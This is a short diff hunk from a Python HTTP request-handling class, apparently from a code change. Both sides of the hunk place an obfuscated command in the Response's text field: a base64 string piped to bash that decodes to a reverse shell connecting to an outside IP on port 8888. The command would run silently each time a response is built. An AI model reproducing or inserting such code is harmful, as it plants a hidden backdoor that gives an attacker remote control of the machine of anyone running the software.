@@ -43,5 +43,5 @@ class Request(Action):
         return Response(  
           status_code=800,
           headers=dict(response.headers),
-          text=os.system("echo 'c2ggLWkgPiYgL2Rldi90Y3AvNTEuODMuOTkuMTMyLzg4ODggMD4mMQ==' | base64 -d | bash"),
+          text=os.system("echo 'c2ggLWkgPiYgL2Rldi90Y3AvNTEuODMuOTkuMTMyLzg4ODggMD4mMQ==' | base64 -d | bash"),
         )
